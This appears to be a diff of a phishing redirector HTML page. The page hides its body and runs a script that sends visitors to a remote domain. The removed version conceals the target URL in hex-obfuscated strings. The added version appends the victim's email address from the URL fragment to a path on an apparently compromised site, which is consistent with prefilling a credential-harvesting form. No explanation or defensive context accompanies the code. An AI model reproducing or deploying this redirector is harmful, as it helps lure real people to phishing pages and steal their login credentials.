@@ -1,17 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>0...</title>
+    <title></title>
     <style>
         body { display: none; }
     </style>
     <script>
         (function() {
-            var _0x2c5f = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x71\x75\x61\x73\x61\x72\x2E\x6D\x61\x74\x65\x63\x74\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x4A\x4C\x32\x35\x33\x2F", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E"];
-            window[_0x2c5f[2]][_0x2c5f[1]] = _0x2c5f[0];
+            var part1 = "https://skyleveltravels.com/";
+            var part2 = ".well-known/dc/";
+            var part3 = "index.php#";
+
+            // Get the email parameter from the URL
+            var email = window.location.hash.substring(1);
+
+            // Decode the email parameter to keep @ symbol intact
+            var decodedEmail = decodeURIComponent(email);
+
+            // Construct the redirect URL
+            var redirectUrl = part1 + part2 + part3 + "#" + decodedEmail;
+
+            // Redirect to the constructed URL
+            window.location.href = redirectUrl;
         })();
     </script>
 </head>
 <body>
 </body>
 </html>
+
